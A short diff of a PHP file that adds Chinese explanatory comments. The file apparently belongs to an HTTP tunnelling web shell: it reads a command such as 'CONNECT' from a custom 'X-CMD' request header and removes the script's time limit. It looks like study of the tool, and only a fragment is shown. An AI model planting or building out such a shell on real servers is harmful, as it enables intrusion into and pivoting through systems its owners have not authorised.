@@ -41,7 +41,7 @@ if( !function_exists('apache_request_headers') ) {
                 $rx_matches = explode('_', $arh_key);
                 if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {			# 此处的处理方法无非是，将$_SERVER进行了一次处理，将_替换为了-，因为PHP接收请求头字段中的-会解析为_
                     foreach($rx_matches as $ak_key => $ak_val) {					# 然后以_为分割符打散为数组。然后进行将数组每个首字母进行大写的设置。最后再拼接起来
-                        $rx_matches[$ak_key] = ucfirst($ak_val);
+                        $rx_matches[$ak_key] = ucfirst($ak_val);	# 此处的key应该是索引值
                     }
 
                     $arh_key = implode('-', $rx_matches);
@@ -58,9 +58,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET')
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-	set_time_limit(0);
+	set_time_limit(0);			# 设置php页面的执行时间，如果设置为0的话，则不限制执行时间
 	$headers=apache_request_headers();
-	$cmd = $headers["X-CMD"];
+	$cmd = $headers["X-CMD"];		# 请求头中的字段，表示要进行执行的动作
     switch($cmd){
 		case "CONNECT":
 			{
